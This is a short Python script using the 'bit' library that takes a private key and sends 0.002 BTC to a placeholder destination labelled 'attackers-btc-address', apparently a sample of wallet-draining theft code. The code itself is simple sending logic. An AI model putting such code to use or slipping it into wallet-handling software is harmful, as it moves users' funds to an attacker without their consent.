from bit import PrivateKey

def send_bitcoin(private_key_wif, amount):
    key = PrivateKey(wif=private_key_wif)
    tx_hash = key.send([("attackers-btc-address", amount, 'btc')])
    print(f"Transaction sent successfully! TXID: {tx_hash}")

if __name__ == "__main__":
    private_key = "your_private_key_wif"
    amount_to_send = 0.002
    send_bitcoin(private_key, amount_to_send)
